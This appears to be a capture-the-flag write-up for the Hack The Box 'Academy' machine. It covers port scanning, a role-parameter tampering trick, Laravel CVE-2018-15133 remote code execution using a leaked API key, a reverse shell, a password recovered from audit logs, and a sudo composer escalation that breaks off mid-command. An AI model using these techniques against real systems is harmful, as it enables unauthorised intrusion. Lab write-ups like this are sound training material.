Lets have a look into academy box. It was easy box with some really nice steps to get root of box

![](/images/academy/logo.png)

Lets start our enumeration with nmap

```bash
nmap -sC -sV -oA nmap/initial 10.10.10.215
# Nmap 7.91 scan initiated Fri Feb 26 23:42:58 2021 as: nmap -sC -sV -oA nmap/initial 10.10.10.215

# Nmap done at Fri Feb 26 23:43:23 2021 -- 1 IP address (1 host up) scanned in 25.48 seconds
```

Also run full nmap scan to look for less common ports

```bash
nmap -p - -oA nmap/allports 10.10.10.215
# Nmap 7.91 scan initiated Fri Feb 26 23:43:43 2021 as: nmap -p - -oA nmap/allports 10.10.10.215
Nmap scan report for 10.10.10.215

33060/tcp open  mysqlx

# Nmap done at Sat Feb 27 00:07:48 2021 -- 1 IP address (1 host up) scanned in 1444.62 seconds
```

3 ports are open:
* 22 for SSH
* 80 for HTTP
* 33060 for MySQLx

As I dont have any username and also not sure if any restriction is set on SSH i will move to port 80. From scan we can see that its redirecting to academy.htb. I set it up in /etc/hosts

```bash
cat /etc/hosts        
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.215    academy.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Navigate to website and was welcome with this screen.

I as don't have login information i decided to create account

![](/images/academy/02-login.png)

After successful registration i log into website.

![](/images/academy/03-in.png)

I start looking around looking for something interesting. All link was dead. I check burp suite for some clues and found out that during registration there is one more paramater that can be manipulated.

![](/images/academy/04-req.png)

Roleid? What happen if i will intercept this request and change value to 1? That could give me some additional access. When i logged with new account I had some access. 

I decide to run gobuster

```bash 
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 25 -o gobuster -u http://academy.htb

/images (Status: 301)
/login.php (Status: 200)
/register.php (Status: 200)
/index.php (Status: 200)
/admin.php (Status: 200)
/home.php (Status: 302)
/config.php (Status: 200)
```

I noticed admin.php site. Admin.php contain login form. Log in with user i created before. The one i change RoleId to 1

All issue or task was done except one. Fix issue with dev-staging-01.academy.htb. I adjust my /etc/hosts again and navigate to this site.

It was error code from Laravel site. As this show really interesting information about as mysql credentials and API keys. After ask my best friend google for some advice... he suggested to look into this page [exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133). Release of this exploit was couple months ago and it only require API key. Clone repository and test it

```bash
python3 pwn_laravel.py http://dev-staging-01.academy.htb/ "dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
I had remote code execution on server. I search for netcat and server contain nc.openbsd version. I copied reverse shell from payloads all the things and got shell on box

```bash
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.215] 43500          
/bin/sh: 0: can't access tty; job control turned off
$ $ whoami                                         
www-data 
```

I start looking for clues. Try to log into mysql server but credentials i had from dev portal did not work. Start looking for credential from academy.htb. 

```bash

```

There is different credentials. As common issue is sharing credentials I try log in as on of users. And it worked for user *cry0l1t3*. After poking around also noticed that user mrb3n have ability to run sudo. I run linpeas.sh again this server

Because user is in adm group which mean he can access /var/log files. And my linpeas give me this

```bash 
[+] Checking for TTY (sudo/su) passwords in audit logs      
/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

Data seem really interesting. Actually its HEX value. I open cyberchef and try to decode it. 

![](/images/academy07-user.png)

I got password for user mrb3n. As I know user can run sudo command i tried to get some quick win

```bash
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:                        
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User mrb3n may run the following commands on academy:                   
    (ALL) /usr/bin/composer
```

Composer was included in [gtfobins](https://gtfobins.github.io/gtfobins/composer/)

Copy paste example from there and was welcome with root shell

```bash
mrb3n@academy:~$ TF=$(mktemp -d)
